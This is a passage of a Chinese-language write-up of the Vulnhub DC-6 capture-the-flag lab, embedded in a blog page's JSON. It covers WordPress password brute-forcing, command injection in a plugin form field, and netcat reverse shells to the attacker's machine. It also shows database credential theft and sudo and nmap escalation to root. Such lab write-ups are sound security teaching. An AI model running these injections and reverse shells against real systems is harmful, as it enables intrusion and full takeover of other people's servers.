class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    4KB - /wp-includes/                                     \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e405\u003c/span\u003e -   42B  - /xmlrpc.php \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试爆破用户但是没成功（使用\u003ccode\u003ecewl\u003c/code\u003e生成字典然后再通过\u003ccode\u003eJohn\u003c/code\u003e拓展字典），然后本想着用\u003ccode\u003erockyou\u003c/code\u003e字典给五个用户直接爆破的，但是结果需要\u003ccode\u003e71721960\u003c/code\u003e 次请求，最后发现作者其实给了提示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eOK, this isn\u003cspan class=\"hljs-string\"\u003e't really a clue as such, but more of some \"we don'\u003c/span\u003et want to spend five years waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a certain process to finish\u003cspan class=\"hljs-string\"\u003e\" kind of advice for those who just want to get on with the job.\n\ncat /usr/share/wordlists/rockyou.txt | grep k01 \u003e passwords.txt That should save you a few years. ;-)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e好家伙，我们去尝试尝试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecat /usr/share/wordlists/rockyou.txt | grep k01 \u003e passwd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后接着使用\u003ccode\u003ewpscan\u003c/code\u003e爆破，\u003ccode\u003ewordy-uname\u003c/code\u003e的内容是枚举出来的那几个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewpscan --url http://wordy --usernames wordy-uname --passwords passwd\n//\n[!] Valid Combinations Found:\n | Username: mark, Password: helpdesk01\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破出了用户\u003ccode\u003emark\u003c/code\u003e的密码\u003ccode\u003ehelpdesk01\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e登陆后台，无死角寻找可利用的点，在\u003ccode\u003eActivity Monitor\u003c/code\u003e发现个奇怪的点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-6/image34.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网上查阅漏洞，发现只要输入 \u003ccode\u003eip | command\u003c/code\u003e 即可执行命令，比如输入 \u003ccode\u003e127.0.0.1 | ls\u003c/code\u003e 再点击\u003ccode\u003elookup\u003c/code\u003e ,就会执行\u003ccode\u003els\u003c/code\u003e命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e\n\nThe IP address \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e | ls resolves to .\n\nOutput \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e dig:\n\nabout.php\nadmin-ajax.php\nadmin-footer.php\n\n.....\n\nuser-edit.php\nuser-new.php\nusers.php\nwidgets.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e本来想着直接输入反弹\u003ccode\u003eshell\u003c/code\u003e命令但是发现有长度限制，我们输入\u003ccode\u003e127.0.0.1 | ls\u003c/code\u003e 抓包看看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"ip\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e | ls\n-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"lookup\"\u003c/span\u003e\n\nLookup\n-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e--\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将\u003ccode\u003els\u003c/code\u003e改为别的命令测试，返回结果显示\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-6/image35.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们将命令改为反弹\u003ccode\u003eshell\u003c/code\u003e命令，同时\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"ip\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e | nc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"lookup\"\u003c/span\u003e\n\nLookup\n-----------------------------\u003cspan class=\"hljs-number\"\u003e129755843329691969431898324683\u003c/span\u003e--\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ whoami\nwww-data\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n$ uname -a\nLinux dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在wp-admin.php下存在数据库账号密码\u003ccode\u003ewpdbuser\u003c/code\u003e，\u003ccode\u003emeErKatZ\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'wpdbuser'\u003c/span\u003e );\n\n/** MySQL database password */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'meErKatZ'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录数据库发现是\u003ccode\u003eMariaDB\u003c/code\u003e ，尝试查找有用数据，查看用户表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eselect * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e wp_users;\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n|  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-04-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1730559782\u003c/span\u003e:$P$BKYxKh8422wMLCjdKGb5OIG7VWZZX3/ |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | admin           |\n|  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-04-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e |                                               |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | Graham Bond     |\n|  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-04-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e |                                               |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | Mark Jones      |\n|  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e/ | sarah         | sarah@blahblahblah1.net.au  |          | \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-04-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e |                                               |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | Sarah Balin     |\n|  \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-04-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:04:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e1556111080\u003c/span\u003e:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | Jens Dagmeister |\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003ejohn\u003c/code\u003e爆破，好久了都没出来，寻找别的线索\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现mark用户的加目录下存在\u003ccode\u003ethings-to-do.txt\u003c/code\u003e ，里面有\u003ccode\u003egraham\u003c/code\u003e用户的账号密码，尝试\u003ccode\u003essh\u003c/code\u003e登录，成功进入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ cat things-to-do.txt\n//\nThings to do:\n\n- Restore full functionality \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the hyperdrive (need to speak to Jens)\n- Buy present \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Sarah\u003cspan class=\"hljs-string\"\u003e's farewell party\n- Add new user: graham - GSo7isUM1D4 - done\n- Apply for the OSCP course\n- Buy new laptop for Sarah'\u003c/span\u003es replacement\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限，可以使用\u003ccode\u003ejens\u003c/code\u003e用户执行\u003ccode\u003ebackups.sh\u003c/code\u003e脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egraham@dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e graham on dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser graham may run the following commands on dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\n    (jens) NOPASSWD: /home/jens/backups.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看脚本内容，就是备份网站内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egraham@dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:/home/jens$ cat backups.sh \n//\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\ntar -czf backups.tar.gz /var/www/html\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们将反弹\u003ccode\u003eshell\u003c/code\u003e语句追加到文件尾部，然后运行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho nc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash \u003e\u003e backups.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注意kali记得先开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esudo -u jens /home/jens/backups.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得新的用户\u003ccode\u003eshell\u003c/code\u003e，用户是\u003ccode\u003ejens\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewhoami\njens\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限，存在\u003ccode\u003eroot\u003c/code\u003e权限的\u003ccode\u003enmap\u003c/code\u003e ，可以进行提权了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejens@dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:/var$ sudo -l\nsudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jens on dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser jens may run the following commands on dc-\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/nmap\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e提权\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e编写提权脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ echo \u003cspan class=\"hljs-string\"\u003e\"os.execute('/bin/sh')\"\u003c/span\u003e \u003e getshell.nse\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e执行脚本，获得root权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ sudo nmap --script=getshell.nse\n\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cat theflag.txt\u003c/span\u003e\n\nYb        dP \u003cspan class=\"hljs-number\"\u003e888888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e         8888b.   dP\u003cspan class=\"hljs-string\"\u003e\"Yb  88b 88 888888 d8b \n Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P \n  YbdPYbdP   88\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"   `\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e' \n   YP  YP    888888 88ood8 88ood8     8888Y\"   YbodP  88  Y8 888888 (8) \n\nCongratulations!!!\n\nHope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and who have taken time to complete these little\nchallenges.\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - DC-6","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubDC-6"},"buildId":"lg8P0Lo-zDl0pbzeQCZZz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>